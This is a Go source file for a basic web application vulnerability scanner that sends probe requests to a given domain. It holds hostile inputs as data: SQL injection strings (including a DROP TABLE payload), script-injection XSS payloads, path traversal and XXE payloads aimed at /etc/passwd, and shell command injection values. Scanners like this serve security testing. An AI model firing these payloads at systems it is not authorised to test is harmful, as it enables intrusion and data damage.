package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
)

// WebVuln represents a web vulnerability finding
type WebVuln struct {
	Type        string
	Severity    string
	URL         string
	Parameter   string
	Payload     string
	Evidence    string
	Description string
}

// webVulnScanner performs basic web application vulnerability scanning
func webVulnScanner(domain string) ([]string, error) {

	var results []string
	var vulns []WebVuln
	var mu sync.Mutex
	var wg sync.WaitGroup

	baseURL := domain
	if !strings.HasPrefix(domain, "http") {
		baseURL = "https://" + domain
	}

	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	tests := []func(string, *http.Client, *[]WebVuln, *sync.Mutex){
		testSQLInjection,
		testXSS,
		testDirectoryTraversal,
		testCommandInjection,
		testXXE,
		testCSRF,
		testSecurityHeaders,
		testErrorHandling,
	}

	for _, test := range tests {
		wg.Add(1)
		go func(testFunc func(string, *http.Client, *[]WebVuln, *sync.Mutex)) {
			defer wg.Done()
			testFunc(baseURL, client, &vulns, &mu)
		}(test)
	}

	wg.Wait()

	if len(vulns) == 0 {
		results = append(results, "No obvious web application vulnerabilities detected")
	} else {
		results = append(results, fmt.Sprintf("Found %d potential vulnerabilities:\n", len(vulns)))

		severityGroups := make(map[string][]WebVuln)
		for _, vuln := range vulns {
			severityGroups[vuln.Severity] = append(severityGroups[vuln.Severity], vuln)
		}

		severities := []string{"Critical", "High", "Medium", "Low", "Info"}
		for _, sev := range severities {
			if vulnList := severityGroups[sev]; len(vulnList) > 0 {
				results = append(results, fmt.Sprintf("\n=== %s SEVERITY ===", strings.ToUpper(sev)))
				for i, vuln := range vulnList {
					results = append(results, fmt.Sprintf("%d. %s", i+1, vuln.Type))
					results = append(results, fmt.Sprintf("   URL: %s", vuln.URL))
					if vuln.Parameter != "" {
						results = append(results, fmt.Sprintf("   Parameter: %s", vuln.Parameter))
					}
					if vuln.Evidence != "" {
						results = append(results, fmt.Sprintf("   Evidence: %s", vuln.Evidence))
					}
					results = append(results, fmt.Sprintf("   Description: %s", vuln.Description))
					results = append(results, "")
				}
			}
		}
	}

	return results, nil
}

// testSQLInjection
func testSQLInjection(baseURL string, client *http.Client, vulns *[]WebVuln, mu *sync.Mutex) {
	payloads := []string{
		"'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "'; DROP TABLE users; --",
		"1' UNION SELECT 1,2,3--", "admin'--", "' OR 1=1#",
	}
	params := []string{"id", "user", "username", "password", "email", "search", "q"}

	for _, param := range params {
		for _, payload := range payloads {
			testURL := fmt.Sprintf("%s?%s=%s", baseURL, param, url.QueryEscape(payload))
			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			bodyStr := strings.ToLower(string(body))
			sqlErrors := []string{"sql syntax", "mysql", "postgresql", "sqlite", "unclosed quotation mark", "database error"}

			for _, errorPattern := range sqlErrors {
				matched, _ := regexp.MatchString(errorPattern, bodyStr)
				if matched {
					mu.Lock()
					*vulns = append(*vulns, WebVuln{
						Type:        "SQL Injection",
						Severity:    "High",
						URL:         testURL,
						Parameter:   param,
						Payload:     payload,
						Evidence:    errorPattern,
						Description: "Possible SQL injection vulnerability",
					})
					mu.Unlock()
				}
			}
		}
	}
}

// testXSS
func testXSS(baseURL string, client *http.Client, vulns *[]WebVuln, mu *sync.Mutex) {
	payloads := []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",
		"'\"><script>alert('XSS')</script>",
	}
	params := []string{"q", "search", "query", "name", "comment", "message"}

	for _, param := range params {
		for _, payload := range payloads {
			testURL := fmt.Sprintf("%s?%s=%s", baseURL, param, url.QueryEscape(payload))
			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			if strings.Contains(string(body), payload) {
				mu.Lock()
				*vulns = append(*vulns, WebVuln{
					Type:        "Cross-Site Scripting (XSS)",
					Severity:    "High",
					URL:         testURL,
					Parameter:   param,
					Payload:     payload,
					Evidence:    "Payload reflected in response",
					Description: "Reflected XSS detected",
				})
				mu.Unlock()
			}
		}
	}
}

// testDirectoryTraversal
func testDirectoryTraversal(baseURL string, client *http.Client, vulns *[]WebVuln, mu *sync.Mutex) {
	payloads := []string{
		"../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	}
	params := []string{"file", "path", "page", "doc"}

	for _, param := range params {
		for _, payload := range payloads {
			testURL := fmt.Sprintf("%s?%s=%s", baseURL, param, url.QueryEscape(payload))
			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			if strings.Contains(string(body), "root:x:0:0:") || strings.Contains(string(body), "[boot loader]") {
				mu.Lock()
				*vulns = append(*vulns, WebVuln{
					Type:        "Directory Traversal",
					Severity:    "High",
					URL:         testURL,
					Parameter:   param,
					Payload:     payload,
					Evidence:    "System file contents detected",
					Description: "Directory traversal detected",
				})
				mu.Unlock()
			}
		}
	}
}

// testCommandInjection
func testCommandInjection(baseURL string, client *http.Client, vulns *[]WebVuln, mu *sync.Mutex) {
	payloads := []string{"; ls", "| whoami", "& dir", "`id`", "$(whoami)"}
	params := []string{"cmd", "exec", "system", "ping"}

	for _, param := range params {
		for _, payload := range payloads {
			testURL := fmt.Sprintf("%s?%s=%s", baseURL, param, url.QueryEscape(payload))
			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			bodyStr := strings.ToLower(string(body))
			if strings.Contains(bodyStr, "uid=") || strings.Contains(bodyStr, "gid=") {
				mu.Lock()
				*vulns = append(*vulns, WebVuln{
					Type:        "Command Injection",
					Severity:    "Critical",
					URL:         testURL,
					Parameter:   param,
					Payload:     payload,
					Evidence:    "Command output detected",
					Description: "Command injection detected",
				})
				mu.Unlock()
			}
		}
	}
}

// testXXE
func testXXE(baseURL string, client *http.Client, vulns *[]WebVuln, mu *sync.Mutex) {
	xxePayload := `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`
	req, _ := http.NewRequest("POST", baseURL, strings.NewReader(xxePayload))
	req.Header.Set("Content-Type", "application/xml")
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if strings.Contains(string(body), "root:x:0:0:") {
		mu.Lock()
		*vulns = append(*vulns, WebVuln{
			Type:        "XML External Entity (XXE)",
			Severity:    "High",
			URL:         baseURL,
			Evidence:    "System file contents detected",
			Description: "XXE vulnerability detected",
		})
		mu.Unlock()
	}
}

// testCSRF
func testCSRF(baseURL string, client *http.Client, vulns *[]WebVuln, mu *sync.Mutex) {
	resp, err := client.Get(baseURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	bodyStr := strings.ToLower(string(body))

	if strings.Contains(bodyStr, "<form") && !strings.Contains(bodyStr, "csrf") {
		mu.Lock()
		*vulns = append(*vulns, WebVuln{
			Type:        "Missing CSRF Protection",
			Severity:    "Medium",
			URL:         baseURL,
			Evidence:    "Form without CSRF token",
			Description: "Forms may be vulnerable to CSRF",
		})
		mu.Unlock()
	}
}

// testSecurityHeaders
func testSecurityHeaders(baseURL string, client *http.Client, vulns *[]WebVuln, mu *sync.Mutex) {
	resp, err := client.Get(baseURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	headers := resp.Header
	securityHeaders := map[string]string{
		"X-Frame-Options":           "Medium",
		"X-Content-Type-Options":    "Low",
		"X-XSS-Protection":          "Low",
		"Strict-Transport-Security": "Medium",
		"Content-Security-Policy":   "High",
	}

	for header, severity := range securityHeaders {
		if headers.Get(header) == "" {
			mu.Lock()
			*vulns = append(*vulns, WebVuln{
				Type:        fmt.Sprintf("Missing %s", header),
				Severity:    severity,
				URL:         baseURL,
				Evidence:    fmt.Sprintf("%s header not found", header),
				Description: "Security header missing",
			})
			mu.Unlock()
		}
	}
}

// testErrorHandling
func testErrorHandling(baseURL string, client *http.Client, vulns *[]WebVuln, mu *sync.Mutex) {
	errorURLs := []string{baseURL + "/nonexistent", baseURL + "/'"}

	for _, testURL := range errorURLs {
		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))
		disclosurePatterns := []string{"stack trace", "exception", "mysql", "nginx/", "php"}

		for _, pattern := range disclosurePatterns {
			if strings.Contains(bodyStr, pattern) {
				mu.Lock()
				*vulns = append(*vulns, WebVuln{
					Type:        "Information Disclosure",
					Severity:    "Low",
					URL:         testURL,
					Evidence:    pattern,
					Description: "Error message reveals system info",
				})
				mu.Unlock()
			}
		}
	}
}
